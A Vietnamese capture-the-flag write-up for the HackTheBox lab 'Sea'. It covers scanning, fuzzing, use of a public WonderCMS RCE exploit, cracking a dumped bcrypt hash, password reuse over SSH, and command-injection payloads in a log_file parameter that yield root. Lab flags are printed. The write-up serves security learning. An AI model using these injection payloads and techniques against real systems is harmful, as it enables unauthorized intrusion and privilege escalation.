<img width="1857" height="946" alt="image" src="https://github.com/user-attachments/assets/cdd7ef41-64c7-4eaa-8fab-dcbc92bd01f7" /># Sea

<img width="1383" height="769" alt="image" src="https://github.com/user-attachments/assets/da6b5ca2-76ae-47fb-8bec-1a95dcefc038" />

Tôi dùng nmap để scan các port đang có và ra được port 80 và 22:
```
❯ sudo nmap -sV 10.10.11.28
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-11 10:57 +0700
Nmap scan report for sea.htb (10.10.11.28)
Host is up (0.066s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
```
Sau khi truy cập ip thì trang web có giao diện như sau:

<img width="1857" height="946" alt="image" src="https://github.com/user-attachments/assets/7e41ff39-2555-42ab-94ef-73d650e72cb5" />

Khi xem source bằng ctrl U thì thấy có đường link là `http://sea.htb/contact.php`, tôi thử sửa trong `/etc/hosts` trỏ địa chỉ ip đó tới domain đó

<img width="893" height="643" alt="image" src="https://github.com/user-attachments/assets/d73676de-bf01-4519-a699-73d40eb340f9" />

<img width="1529" height="849" alt="image" src="https://github.com/user-attachments/assets/a74442da-544f-498f-a51f-6e889c85dc8a" />

Trong quá trình fuzz bằng `ffuf -u "http://sea.htb/FUZZ" -w wordlist/super_mega_wordlist.txt` thì tôi tìm được `http://sea.htb/themes/bike/`, tiếp tuc fuzz thì ra 1 số thông tin nhạy cảm:
```
❯ ffuf -u "http://sea.htb/themes/bike/FUZZ" -w wordlist/namdt_wordlist_1.txt -fc 403,500 | grep -v "Status: 403"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/bike/FUZZ
 :: Wordlist         : FUZZ: /home/namdeptrai/wordlist/namdt_wordlist_1.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403,500
________________________________________________

404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 233ms]
css                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 54ms]
home                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 53ms]
img                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 56ms]
LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 57ms]
README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 64ms]
summary                 [Status: 200, Size: 66, Words: 9, Lines: 2, Duration: 66ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 53ms]
:: Progress: [54602/54602] :: Job [1/1] :: 49 req/sec :: Duration: [0:01:57] :: Errors: 1 ::
```
Truy cập vào `README.md` thì biết được trang web sử dụng công nghệ `WonderCMS` và ở `version` có hiện thỉ phiên bản `3.2.0`

<img width="567" height="394" alt="image" src="https://github.com/user-attachments/assets/cc27dbfc-7e95-40c9-865e-0c291e8c68b7" />

Search google thì tôi tìm được 1 cái CVE liên quan đến là [CVE-2023-41425](https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE) dẫn tới lỗi RCE

Tôi tải về và chạy exploit:

<img width="1863" height="604" alt="image" src="https://github.com/user-attachments/assets/bece00a8-5448-48e4-8672-7a1065fc865b" />

Tôi tìm được file `database.js`:
```
www-data@sea:/var/www/sea$ ls data
ls data
cache.json
database.js
files
www-data@sea:/var/www/sea$
```

Ở trong file `database.js` thì tôi tìm được hash của mật khẩu:

```
cat data/database.js 
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2025\/09\/11 03:52:26": "127.0.0.1",
            "2025\/09\/10 14:20:28": "10.10.14.32",
            "2025\/09\/10 14:06:18": "127.0.0.1",
            "2025\/09\/10 13:51:47": "127.0.0.1",
            "2025\/09\/10 13:42:17": "127.0.0.1"
        },
        "lastModulesSync": "2025\/09\/11",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
        "logoutToLoginScreen": {}
    },
    "pages": {
        "404": {
            "title": "404",
            "keywords": "404",
            "description": "404",
            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
            "subpages": {}
        },
        "home": {
            "title": "Home",
            "keywords": "Enter, page, keywords, for, search, engines",
            "description": "A page description is also good for search engines.",
            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
            "subpages": {}
        },
        "how-to-participate": {
            "title": "How to",
            "keywords": "Enter, keywords, for, this page",
            "description": "A page description is also good for search engines.",
            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
            "subpages": {}
        }
    },
    "blocks": {
        "subside": {
            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
        },
        "footer": {
            "content": "©2024 Sea"
        }
    }
}
```
Dùng hashcat để mò ra mật khẩu là `hashcat -m 3200 ~/hashcat/target.txt ~/wordlist/rockyou.txt` thì ra được password là `mychemicalromance`, tôi mở file `/etc/passwd` thì ra được có 3 user là có vẻ có thể ssh vào:
```
www-data@sea:/var/www/sea$ ^[[A
cat /etc/passwd | grep "bash"
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash
```
Khi đăng nhập `amay` với mật khẩu `mychemicalromance` thì vào được:
```
amay@sea:~$ cat user.txt
1a8662094374a0fa323ee8ef3255469b
```
Tôi check xem các port nào đang sử dụng trên server:
```
amay@sea:~$ ss -ltnp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process   
LISTEN    0         4096             127.0.0.1:8080             0.0.0.0:*                
LISTEN    0         511                0.0.0.0:80               0.0.0.0:*                
LISTEN    0         10               127.0.0.1:48181            0.0.0.0:*                
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*                
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*                
LISTEN    0         128                   [::]:22                  [::]:*    
```
Có cái port 8080 và 48181, curl vào thì 8080 có trả về kết quả là 1 trang web 

Tôi trỏ port 8080 ra ngoài `ssh -L 8081:localhost:8080 amay@10.10.11.28` , truy cập vào là trang web, tôi dùng cred là `amay:mychemicalromance` thì vào được:

<img width="1612" height="812" alt="image" src="https://github.com/user-attachments/assets/6d4f8dfb-8c59-4582-933e-6f9aee4f9f29" />

Trang web phân tích các tệp `auth.log` và `access.log`, vào burp thì thấy nó sử dụng param `log_file` để phân tích 

<img width="1525" height="869" alt="image" src="https://github.com/user-attachments/assets/ea6b6c1e-e46f-4ea1-8fb5-942bdfea117e" />

Tôi thử cmdi bằng payload `log_file=%2Fvar%2Flog%2Fauth.log;touch+/tmp/hello.txt` tạo file `/tmp/hello.txt`:

<img width="1294" height="515" alt="image" src="https://github.com/user-attachments/assets/8936a4e2-3928-45dc-8375-ae29bb8f25d9" />

Tôi sử dụng `log_file=%2Fvar%2Flog%2Fauth.log;id+>+/tmp/hello.txt` để ghi kết quả của lệnh id vào `/tmp/hello.txt`, khi mở file ra thì có kết quả:
```
amay@sea:/tmp$ cat hello.txt 
uid=0(root) gid=0(root) groups=0(root)
```
Vậy là có thể leo lên quyền root:
```
amay@sea:/tmp$ cat hello.txt 
f71cec56e1ef23940142ddcfc10bd41a
```








